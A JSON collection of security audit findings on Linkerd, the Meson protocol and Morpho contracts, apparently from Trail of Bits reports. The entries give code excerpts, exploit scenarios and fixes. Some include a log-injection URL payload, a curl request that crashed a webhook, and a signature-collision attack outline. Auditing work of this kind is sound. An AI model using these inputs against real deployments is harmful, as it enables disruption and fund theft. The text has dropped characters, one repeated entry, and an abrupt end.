        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "The Init function responsible for initializing port-forwarding connections for Kubernetes causes a goroutine leak when connections succeed. This is because the failure channel in the Init function is set up as an unbuered channel. Consequently, the failure channel blocks the execution of the anonymous goroutine in which it is used unless an error is received from pf.run(). Whenever a message indicating success is received by readChan, the Init function returns without rst releasing the resources allocated by the anonymous goroutine, causing those resources to be leaked. func (pf *PortForward) Init() error { // (...) failure := make(chan error) go func() { if err := pf.run(); err != nil { failure <- err } }() // (...)` select { case <-pf.readyCh: log.Debug(\"Port forward initialised\") case err := <-failure: log.Debugf(\"Port forward failed: %v\", err) return err } Figure 6.1: pkg/k8s/portforward.go#L200-L220 Recommendations Short term, make the failure channel a buered channel of size 1. That way, the goroutine will be cleaned and destroyed when the function returns regardless of which case occurs rst. Long term, run GCatch against goroutine-heavy packages to detect the mishandling of channel bugs. Refer to appendix C for guidance on running GCatch. Basic instances of this issue can also be detected by running this Semgrep rule.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Risk of log injection in TAP service API ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "Requests sent to the TAP service API endpoint, /apis/tap, via the POST method are handled by the handleTap method. This method parses a namespace and a name obtained from the URL of the request. Both the namespace and name variables are then used in a log statement for printing debugging messages to standard output. Because both elds are user controllable, an attacker could perform log injection attacks by calling such API endpoints with a namespace or name with newline indicators, such as \\n. func (h *handler) handleTap(w http.ResponseWriter, req *http.Request, p httprouter.Params) { namespace := p.ByName(\"namespace\") name := p.ByName(\"name\") resource := \"\" // (...) h.log.Debugf(\"SubjectAccessReview: namespace: %s, resource: %s, name: %s, user: <%s>, group: <%s>\", namespace, resource, name, h.usernameHeader, h.groupHeader, ) Figure 7.1: viz/tap/api/handlers.go#L106-L125 Exploit Scenario An attacker submits a POST request to the TAP service API using the URL /apis/tap.linkerd.io/v1alpha1/watch/myns\\nERRO[0000]<attackers log message>/tap, causing invalid logs to be printed and tricking an operator into falsely believing there is a failure. Recommendations Short term, ensure that all user-controlled input is sanitized before it is used in the logging function. Additionally, use the format specier %q instead of %s to prompt Go to perform basic sanitation of strings.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. TLS conguration does not enforce minimum TLS version ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "Transport Layer Security (TLS) is used in multiple locations throughout the codebase. In two cases, TLS congurations do not have a minimum version requirement, allowing connections from TLS 1.0 and later. This may leave the webhook and TAP API servers vulnerable to protocol downgrade and man-in-the-middle attacks. // NewServer returns a new instance of Server func NewServer( ctx context.Context, api *k8s.API, addr, certPath string, handler Handler, component string, ) (*Server, error) { [...] server := &http.Server{ Addr: addr, TLSConfig: &tls.Config{}, } Figure 8.1: controller/webhook/server.go#L43-L64 // NewServer creates a new server that implements the Tap APIService. func NewServer( ctx context.Context, addr string, k8sAPI *k8s.API, grpcTapServer pb.TapServer, disableCommonNames bool, ) (*Server, error) { [...] httpServer := &http.Server{ Addr: addr, TLSConfig: &tls.Config{ ClientAuth: tls.VerifyClientCertIfGiven, ClientCAs: clientCertPool, }, } Figure 8.2: viz/tap/api/sever.go#L34-L76 Exploit Scenario Due to the lack of minimum TLS version enforcement, certain established connections lack sucient authentication and cryptography. These connections do not protect against man-in-the-middle attacks. Recommendations Short term, review all TLS congurations and ensure the MinVersion eld is set to require connections to be TLS 1.2 or newer. Long term, ensure that all TLS congurations across the codebase enforce a minimum version requirement and employ verication where possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Nil dereferences in the webhook server ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "description": "The webhook servers processReq function, used for handling admission review requests, does not properly validate request objects. As a result, malformed requests result in nil dereferences, which cause panics on the server. If the server receives a request with a body that cannot be decoded by the decode function, shown below, an error is returned, and a panic is triggered when the system attempts to access the Request object in line 154. A panic could also occur if the request is decoded successfully into an AdmissionReview object with a missing Request property. In such a case, the panic would be triggered in line 162. 149 func (s *Server) processReq(ctx context.Context, data []byte) *admissionv1beta1.AdmissionReview { 150 151 152 153 154 155 156 157 158 159 160 161 162 admissionReview, err := decode(data) if err != nil { log.Errorf(\"failed to decode data. Reason: %s\", err) admissionReview.Response = &admissionv1beta1.AdmissionResponse{ admissionReview.Request.UID, UID: Allowed: false, Result: &metav1.Status{ Message: err.Error(), }, } return admissionReview } log.Infof(\"received admission review request %s\", admissionReview.Request.UID) 163 log.Debugf(\"admission request: %+v\", admissionReview.Request) Figure 9.1: controller/webhook/server.go#L149-L163 We tested the panic by getting a shell on a container running in the application namespace and issuing the request in gure 9.2. However, the Go server recovers from the panics without negatively impacting the application. curl -i -s -k -X $'POST' -H $'Host: 10.100.137.130:443' -H $'Accept: */*' -H $'Content-Length: 6' --data-binary $'aaaaaa' $'https://10.100.137.130:443/inject/test Figure 9.2: The curl request that causes a panic Recommendations Short term, add checks to verify that request objects are not nil before and after they are decoded. Long term, run the invalid-usage-of-modified-variable rule from the set of Semgrep rules in the CI/CD pipeline to detect this type of bug. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Hash collisions in untyped signatures Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "To post or execute a swap, a user must provide an ECDSA signature on a message containing the encoded swap information. The Meson protocol supports both typed (EIP-712) and legacy untyped (EIP-191) messages. The format of a message is determined by a bit in the encoded swap information itself. The Meson protocol denes two message types, a request message containing only an encoded swap and a release message containing the hash of an encoded swap concatenated with the recipients address. Figure 1.1 shows the relevant signature-verication code. 213 ... 237 238 239 function _checkRequestSignature( if (nonTyped) { bytes32 digest = keccak256(abi.encodePacked( bytes28(0x19457468657265756d205369676e6564204d6573736167653a0a3332), // HEX of \"\\x19Ethereum Signed Message:\\n32\" 240 241 242 243 244 ... 266 ... 293 294 295 encodedSwap )); require(signer == ecrecover(digest, v, r, s), \"Invalid signature\"); return; } function _checkReleaseSignature( if (nonTyped) { digest = keccak256(abi.encodePacked( bytes28(0x19457468657265756d205369676e6564204d6573736167653a0a3332), // HEX of \"\\x19Ethereum Signed Message:\\n32\" 296 297 ... keccak256(abi.encodePacked(encodedSwap, recipient)) )); Figure 1.1: contracts/utils/MesonHelpers.sol 11 Meson Protocol Fix Review Note that the form of both the request and release messages in the gure is \"\\x19Ethereum Signed Message:\\n32\" + msg, where msg is a 32-byte string. If an attacker could nd a message that would be interpreted as valid in both contexts, the attacker could use the signature on that message to both request and release funds, facilitating a number of potential attacks. Specically, the attacker would need to identify swap1, swap2, and recipient values such that swap1 = keccak256(swap2, recipient). The attacker could do that by choosing a valid swap2 value and then iterating through recipient values until nding one for which keccak256(swap2, recipient) would be interpreted as a valid message. With the current restrictions on the swap amount, chain, and token elds, we estimate that this would take between 260 and 270 tries. Fix Analysis This issue has been resolved. Untyped release messages are now prexed by the string \"\\x19Ethereum Signed Message:\\n52\", while request messages are prexed by \"\\x19Ethereum Signed Message:\\n32\". However, if Meson ever introduces new message types with a length of 32 or 53 bytes, their encodings may collide with the encodings of the existing message types. 12 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Typed signatures implement insecure nonstandard encodings Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "EIP-712 species standard encodings for the hashing and signing of typed structured data. The goal of typed structured signing standards is twofold: ensuring a unique injective encoding for structured data in order to prevent collisions (like that detailed in TOB-MES-1) and allowing wallets to display complex structured messages unambiguously in human-readable form. The images in gure 2.1 demonstrate the dierence between a complex untyped unstructured message (left) and its EIP-712 equivalent (right), both in MetaMask: Figure 2.1: A reproduction of images from the EIP-712 standard Meson currently uses a form of typed message encoding that does not conform to EIP-712. Specically, the encoding is not EIP-191 compliant and thus could theoretically collide with 13 Meson Protocol Fix Review the encoding of personal messages (Ethereum signed messages) or Recursive Length Prex (RLP)-encoded transactions. The digest format for swap requests is included in gure 2.2, in which REQUEST_TYPE_HASH corresponds to keccak256(\"bytes32 Sign to request a swap on Meson (Testnet)\"). bytes32 typehash = REQUEST_TYPE_HASH; bytes32 digest; 246 247 248 assembly { 249 250 251 252 253 } mstore(0, encodedSwap) mstore(32, keccak256(0, 32)) mstore(0, typehash) digest := keccak256(0, 64) Figure 2.2: contracts/utils/MesonHelpers.sol#246253 While the message types currently used in the protocol do not appear to have any dangerous interactions with each other, message types added to future versions of the protocol could theoretically introduce such issues. Fix Analysis This issue has not been resolved. Although the issue is not currently exploitable, we recommend that Meson exercise caution when adding new message types to prevent unexpected collisions between those message types and message types used by other protocols. 14 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing validation in the _addSupportToken function Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "Insucient input validation in the _addSupportToken function makes it possible to register the same token as supported multiple times. This does not cause a problem, because if there are duplicate entries for a token in the token list, the last one added will be the one that is used. However, it does mean that multiple indexes could point to the same token, while the token would point to only one of those indexes. function _addSupportToken(address token, uint8 index) internal { require(index != 0, \"Cannot use 0 as token index\"); _indexOfToken[token] = index; _tokenList[index] = token; 47 48 49 50 51 } Figure 3.1: contracts/utils/MesonTokens.sol Fix Analysis This issue has been resolved. The _addSupportToken function now validates that the token has not previously been registered, that the associated list index has not previously been used, and that the tokens address is not zero. The Meson team has also added tests to validate this behavior. 15 Meson Protocol Fix Review 4. Insu\u0000cient event generation Status: Resolved Severity: Informational Diculty: Low Type: Auditing and Logging Finding ID: TOB-MES-4 Target: contracts/Pools/MesonPools.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Use of an uninitialized state variable in functions Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "The _mesonContract address is not set in the UCTUpgradeable contracts initialize function during the contracts initialization. As a result, the value of _mesonContract defaults to the zero address. The UCTUpgradeable.allowance and UCTUpgradeable.transferFrom functions perform checks that rely on the value of the _mesonContract state variable, which may lead to unexpected behavior. address private _mesonContract; function initialize(address minter) public initializer { __ERC20_init(\"USD Coupon Token (https://meson.fi)\", \"UCT\"); _owner = _msgSender(); _minter = minter; // _mesonContract = ; 18 19 20 21 22 23 24 25 } Figure 5.1: contracts/Token/UCTUpgradeable.sol:1825 54 function allowance(address owner, address spender) public view override returns (uint256) { 55 if (spender == _mesonContract) { Figure 5.2: contracts/Token/UCTUpgradeable.sol:5455 65 if (msgSender == _mesonContract && ERC20Upgradeable.allowance(sender, msgSender) < amount) { Figure 5.3: contracts/Token/UCTUpgradeable.sol:65 Fix Analysis This issue has been resolved. The _mesonContract address is now populated by the initialize function. 17 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Risk of upgrade issues due to missing __gap variable Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "None of the Meson protocol contracts include a __gap variable. Without this variable, it is not possible to add any new variables to the inherited contracts without causing storage slot issues. Specically, if variables are added to an inherited contract, the storage slots of all subsequent variables in the contract will shift by the number of variables added. Such a shift would likely break the contract. All upgradeable OpenZeppelin contracts contain a __gap variable, as shown in gure 6.1. 89 90 /** * @dev This empty reserved space is put in place to allow future versions to add new 91 92 93 94 * variables without shifting down storage in the inheritance chain. * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps */ uint256[49] private __gap; Figure 6.1: openzeppelin-contracts-upgradeable/OwnerUpgradeable.sol Fix Analysis This issue has been resolved. All stateful contracts inherited by UpgradableMeson now contain gap slots. Thus, new state variables can be added in future upgrades. 18 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. Lack of a zero-value check on the initialize function Status: Partially Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "The UCTUpgradeable contracts initialize function fails to validate the address of the incoming minter argument. This means that the caller can accidentally set the minter variable to the zero address. function initialize(address minter) public initializer { __ERC20_init(\"USD Coupon Token (https://meson.fi)\", \"UCT\"); _owner = _msgSender(); _minter = minter; // _mesonContract = ; 20 21 22 23 24 25 } Figure 7.1: contracts/Token/UCTUpgradeable.sol:2025 If the minter address is set to the zero address, the admin must immediately redeploy the contract and set the address to the correct value; a failure to do so could result in unexpected behavior. Fix Analysis This issue has been partially resolved. The _mesonContract address, added as a parameter in the resolution of TOB-MES-5, is now checked against the zero value. However, the initialize function does not validate that the minter address is non-zero. 19 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Solidity compiler optimizations can be problematic Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "The Meson protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Fix Analysis This issue has been resolved. The Solidity optimizer in the commit evaluated in this x review has been disabled. However, the Meson team indicated that this change causes the deployment gas amount to exceed the block gas limit. We recommend that Meson closely follow Solidity compiler releases and CHANGELOGs in order to quickly resolve any compiler optimization bugs. 20 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Service fees cannot be withdrawn Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "If the service fee charged for a swap is waived, the fee collected for the swap is stored at index zero of the _balanceOfPoolToken mapping. However, because the fee withdrawal function does not allow withdrawals from index zero of the mapping, the fee can never be withdrawn. Although this limitation may be purposeful, the code appears to indicate that it is a mistake. 198 if (!feeWaived) { // If the swap should pay service fee (charged by Meson protocol) 199 200 201 202 uint256 serviceFee = _serviceFee(encodedSwap); // Subtract service fee from the release amount releaseAmount -= serviceFee; // The collected service fee will be stored in `_balanceOfPoolToken` with `poolIndex = 0` 203 _balanceOfPoolToken[_poolTokenIndexForOutToken(encodedSwap, 0)] += serviceFee; Figure 9.1: contracts/Pools/MesonPools.sol:198203 70 71 72 73 74 function withdraw(uint256 amount, uint48 poolTokenIndex) external { require(amount > 0, \"Amount must be positive\"); uint40 poolIndex = _poolIndexFrom(poolTokenIndex); require(poolIndex != 0, \"Cannot use 0 as pool index\"); Figure 9.2: contracts/Pools/MesonPools.sol:7074 Moreover, even if the function allowed the withdrawal of tokens stored at poolIndex 0, a withdrawal would still not be possible. This is because the owner of poolIndex 0 is not set during initialization, and it is not possible to register a pool with index 0. 13 14 function initialize(address[] memory supportedTokens) public { require(!_initialized, \"Contract instance has already been initialized\"); 21 Meson Protocol Fix Review _initialized = true; _owner = _msgSender(); _premiumManager = _msgSender(); for (uint8 i = 0; i < supportedTokens.length; i++) { _addSupportToken(supportedTokens[i], i + 1); 15 16 17 18 19 20 21 22 } } Figure 9.3: contracts/UpgradableMeson.sol:1322 Fix Analysis This issue has been resolved. The source code now includes comments explaining that the service fee will not be withdrawable until the contract is updated. 22 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Lack of contract existence check on transfer / transferFrom calls Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "The MesonHelpers contract uses the low-level call function to execute the transfer / transferFrom function of an ERC20 token. However, it does not rst perform a contract existence check. Thus, if there is no contract at the token address, the low-level call will still return success. This means that if a supported token is subsequently self-destructed (which is unlikely to happen), it will be possible for a posted swap involving that token to succeed without actually depositing any tokens. function _unsafeDepositToken( address token, address sender, uint256 amount, bool isUCT 53 54 55 56 57 58 ) internal { 59 60 61 62 require(token != address(0), \"Token not supported\"); require(amount > 0, \"Amount must be greater than zero\"); (bool success, bytes memory data) = token.call(abi.encodeWithSelector( bytes4(0x23b872dd), // bytes4(keccak256(bytes(\"transferFrom(address,address,uint256)\"))) 63 64 65 66 sender, address(this), amount // isUCT ? amount : amount * 1e12 // need to switch to this line if deploying to BNB Chain or Conflux 67 68 )); require(success && (data.length == 0 || abi.decode(data, (bool))), \"transferFrom failed\"); 69 } Figure 10.1: contracts/util/MesonHelpers.sol:5369 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first 23 Meson Protocol Fix Review return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 10.2: A snippet of the Solidity documentation detailing unexpected behavior related to call Fix Analysis This issue has been resolved. The low-level call is now paired with OpenZeppelins Address.isContract function, which ensures that the contract at the target address is populated as expected. This makes the deposit mechanism robust against self-destructs. 24 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. USDT transfers to third-party contracts will fail Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "To allow a user to release funds to a smart contract, the Meson protocol increases the contracts allowance (via a call to increaseAllowance) and then calls the contract, as shown in gure 11.1. 66 IERC20Minimal(token).increaseAllowance(contractAddr, adjustedAmount); 67 ITransferWithBeneficiary(contractAddr).transferWithBeneficiary(token, adjustedAmount, beneficiary, data); Figure 11.1: contracts/utils/MesonHelpers.sol#6667 The increaseAllowance method, which is part of OpenZeppelins ERC20 library, was introduced to prevent race conditions when token allowances are changed via top-level calls. However, this method is not in the ERC20 specication, and not all tokens implement it. In particular, USDT does not implement the method on the Ethereum mainnet. Thus, any attempt to release USDT to a smart contract wallet during a swap will fail, trapping the users funds. Fix Analysis This issue has been resolved. The protocol now uses the standard ERC20 approve function to increase allowances. The team also made subtle changes to the allowance behavior: instead of incrementing an allowance when executing a transfer, the Meson contract now sets the allowance to the most recent transfer amount. If a third-party contract has an outstanding allowance from a previous swap release, it will forfeit those tokens upon the next transfer. Meson has conrmed that this is the intended behavior. 25 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. SDK function _randomHex returns low-quality randomness Status: Partially Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "The Meson protocol software development kit (SDK) uses the _randomHex function to generate random salts for new swaps. This function accepts a string length as input and produces a random hexadecimal string of that length. To do that, _randomHex uses the JavaScript Math.random function to generate a 32-bit integer and then encodes the integer as a zero-padded hexadecimal string. The result is eight random hexadecimal characters, padded with zeros to the desired length. However, the function is called with an argument of 16, so half of the characters in the salt it produces will be zero. } 95 96 97 98 99 100 101 102 103 104 } 105 106 107 108 109 110 111 112 113 } private _makeFullSalt(salt?: string): string { if (salt) { if (!isHexString(salt) || salt.length > 22) { throw new Error('The given salt is invalid') } return `${salt}${this._randomHex(22 - salt.length)}` return `0x0000${this._randomHex(16)}` private _randomHex(strLength: number) { if (strLength === 0) { return '' } const max = 2 ** Math.min((strLength * 4), 32) const rnd = BigNumber.from(Math.floor(Math.random() * max)) return hexZeroPad(rnd.toHexString(), strLength / 2).replace('0x', '') Figure 12.1: packages/sdk/src/Swap.ts#95113 Furthermore, the Math.random function is not suitable for uses in which the output of the random number generator should be unpredictable. While the protocols current use of the function does not pose a security risk, future implementers and library users may assume that the function produces the requested amount of high-quality entropy. 26 Meson Protocol Fix Review Fix Analysis This issue has been partially resolved. While the _randomHex function now uses cryptographic randomness to generate random hexadecimal characters, the function continues to silently output leading zeros when more than eight characters are requested or when an odd number of characters is requested. To prevent future misuse of this function, we recommend having it return a uniformly random string with the exact number of characters requested. 27 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. encodedSwap values are used as primary swap identier Status: Unresolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "The primary identier of swaps in the MesonSwap contract is the encodedSwap structure. This structure does not contain the address of a swaps initiator, which is recorded, along with the poolIndex of the bonded liquidity provider (LP), as the postingValue. If a malicious actor or maximal extractable value (MEV) bot were able to front-run a users transaction and post an identical encodedSwap, the original initiators transaction would fail, and the initiators swap would not be posted. 48 function postSwap(uint256 encodedSwap, bytes32 r, bytes32 s, uint8 v, uint200 postingValue) external forInitialChain(encodedSwap) 49 50 { 51 require(_postedSwaps[encodedSwap] == 0, \"Swap already exists\"); ... Figure 13.1: contracts/Swap/MesonSwap.sol#4852 Because the Meson protocol supports only 1-to-1 stablecoin swaps, transaction front-running is unlikely to be protable. However, a bad actor could dramatically aect a specic users ability to transact within the system. Fix Analysis This issue has not been resolved. Meson acknowledged that user transactions can be blocked from execution by malicious actors. However, blocking a swap transaction would require an adversary to post a corresponding swap, and to thus burn gas and have his or her funds temporarily locked; these disincentives limit the impact of this issue. 28 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Unnecessary _releasing mutex increases gas costs Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "When executing a swap in the third-party dApp integration release mode, the Meson protocol makes a call to an untrusted user-specied smart contract. To prevent reentrancy attacks, a ag is set before and cleared after the untrusted contract call. 181 ... require(!_releasing, \"Another release is running\"); 219 220 _transferToContract(_tokenList[tokenIndex], recipient, initiator, amount, _releasing = true; tokenIndex == 255, _saltDataFrom(encodedSwap)); 221 _releasing = false; Figure 14.1: contracts/Pools/MesonPools.sol#181221 This ag is not strictly necessary, as by the time the contract reaches the untrusted call, it has already cleared the _lockSwaps entry corresponding to the release, preventing duplicate releases via reentrancy. uint80 lockedSwap = _lockedSwaps[swapId]; require(lockedSwap != 0, \"Swap does not exist\"); 191 192 ... 196 _checkReleaseSignature(encodedSwap, recipient, r, s, v, initiator); 197 ... 211 _release(encodedSwap, tokenIndex, initiator, recipient, releaseAmount); _lockedSwaps[swapId] = 0; Figure 14.2: contracts/Pools/MesonPools.sol#191197 Fix Analysis This issue has been resolved. The redundant _releasing ag has been removed. The call to the external contract is the last step in the transaction, which prevents reentrancy attacks. 29 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Missing validation in the _addSupportToken function Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "Insucient input validation in the _addSupportToken function makes it possible to register the same token as supported multiple times. This does not cause a problem, because if there are duplicate entries for a token in the token list, the last one added will be the one that is used. However, it does mean that multiple indexes could point to the same token, while the token would point to only one of those indexes. function _addSupportToken(address token, uint8 index) internal { require(index != 0, \"Cannot use 0 as token index\"); _indexOfToken[token] = index; _tokenList[index] = token; 47 48 49 50 51 } Figure 3.1: contracts/utils/MesonTokens.sol Fix Analysis This issue has been resolved. The _addSupportToken function now validates that the token has not previously been registered, that the associated list index has not previously been used, and that the tokens address is not zero. The Meson team has also added tests to validate this behavior. 15 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Insu\u0000cient event generation Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "Several critical operations in the MesonPools contract do not emit events. As a result, it will be dicult to review the correct behavior of the contract once it has been deployed. The following operations should trigger events:  MesonPools.depositAndRegister  MesonPools.deposit  MesonPools.withdraw  MesonPools.addAuthorizedAddr  MesonPools.removeAuthorizedAddr  MesonPools.unlock Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior and may therefore overlook attacks or malfunctioning contracts. Fix Analysis This issue has been resolved. All of the functions listed in this nding now emit events, enabling Meson and protocol users to easily track all contract operations. 16 Meson Protocol Fix Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Misleading result returned by view function getPostedSwap Status: Resolved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MesonProtocolFixReview.pdf",
        "description": "The value returned by the getPostedSwap function to indicate whether a swap has been executed can be misleading. Once a swap has been executed, the value of the swap is reset to either 0 or 1. However, the getPostedSwap function returns a result indicating that a swap has been executed only if the swaps value is 1. if (_expireTsFrom(encodedSwap) < block.timestamp + MIN_BOND_TIME_PERIOD) { // The swap cannot be posted again and therefore safe to remove it. // LPs who execute in this mode can save ~5000 gas. _postedSwaps[encodedSwap] = 0; 141 142 143 144 145 } else { 146 // The same swap information can be posted again, so set `_postedSwaps` value to 1 to prevent that. 147 148 } _postedSwaps[encodedSwap] = 1; Figure 15.1: contracts/Swap/MesonSwap.sol:140148 161 162 163 164 { 165 166 167 168 169 170 171 172 173 } /// @notice Read information for a posted swap function getPostedSwap(uint256 encodedSwap) external view returns (address initiator, address poolOwner, bool executed) uint200 postedSwap = _postedSwaps[encodedSwap]; initiator = _initiatorFromPosted(postedSwap); executed = postedSwap == 1; if (initiator == address(0)) { poolOwner = address(0); } else { } poolOwner = ownerOfPool[_poolIndexFromPosted(postedSwap)]; Figure 15.2: contracts/Swap/MesonSwap.sol:162173 30 Meson Protocol Fix Review Front-end services (or any other service interacting with this function) may be misled by the return value, reacting as though a swap has not been executed when it actually has. Fix Analysis This issue has been resolved. The getPostedSwap functions return value has been renamed to exist, which more accurately reects the meaning of the value. 31 Meson Protocol Fix Review A. Status Categories The following table describes the statuses used to indicate whether an issue has been suciently addressed. Fix Status Status",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "The owner of the IncentivesVault contract and other Ownable Morpho contracts can be changed by calling the transferOwnership function. This function internally calls the _transferOwnership function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. 13 contract IncentivesVault is IIncentivesVault, Ownable { Figure 1.1: Inheritance of contracts/compound/IncentivesVault.sol 62 function transferOwnership(address newOwner) public virtual onlyOwner { 63 64 65 } require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner); Figure 1.2: The transferOwnership function in @openzeppelin/contracts/access/Ownable.sol Exploit Scenario Bob, the IncentivesVault owner, invokes transferOwnership() to change the contracts owner but accidentally enters the wrong address. As a result, he permanently loses access to the contract. Recommendations Short term, for contract ownership transfers, implement a two-step process, in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Incomplete information provided in Withdrawn and Repaid events ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "description": "The core operations in the PositionsManager contract emit events with parameters that provide information about the operations actions. However, two events, Withdrawn and Repaid, do not provide complete information. For example, the withdrawLogic function, which performs withdrawals, takes a _supplier address (the user supplying the tokens) and _receiver address (the user receiving the tokens): /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 _maxGasForMatching ) external Figure 2.1: The function signature of PositionsManagers withdrawLogic function However, the corresponding event in _safeWithdrawLogic records only the msg.sender of the transaction, so the _supplier and _receiver involved in the transaction are unclear. Moreover, if a withdrawal is performed as part of a liquidation operation, three separate addresses may be involvedthe _supplier, the _receiver, and the _user who triggered the liquidationand those monitoring events will have to cross-reference multiple events to understand whose tokens moved where. /// @notice Emitted when a withdrawal happens. /// @param _user The address of the withdrawer. /// @param _poolTokenAddress The address of the market from where assets are withdrawn. /// @param _amount The amount of assets withdrawn (in underlying). /// @param _balanceOnPool The supply balance on pool after update. /// @param _balanceInP2P The supply balance in peer-to-peer after update. event Withdrawn( address indexed _user,  Figure 2.2: The declaration of the Withdrawn event in PositionsManager emit Withdrawn( msg.sender, _poolTokenAddress, _amount, supplyBalanceInOf[_poolTokenAddress][msg.sender].onPool, 